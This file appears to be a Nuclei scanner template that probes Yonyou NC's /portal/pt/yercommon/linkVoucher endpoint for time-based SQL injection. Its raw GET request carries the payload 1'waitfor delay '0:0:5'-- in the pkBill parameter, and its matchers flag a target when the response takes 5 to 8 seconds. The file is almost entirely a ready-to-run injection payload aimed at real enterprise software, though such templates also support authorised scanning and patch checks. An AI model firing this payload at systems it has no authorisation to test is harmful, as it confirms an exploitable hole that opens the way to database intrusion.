id: yongyouNC-linkVoucher-sql
info:
  name: 用友NC linkVoucher SQL注入漏洞
  author: cnaq
  severity: high  
  description: 用友NC linkVoucher SQL注入漏洞
  reference: 
    - https://github.com/wy876/POC/
  tags: yongyouOA,sql,injection 

requests:
  - raw:
      - |
        GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1'waitfor+delay+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive


    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'duration<8' # 漏洞持续时间大于5秒，小于8秒
        condition: and # 将默认的 or 的关系改为 and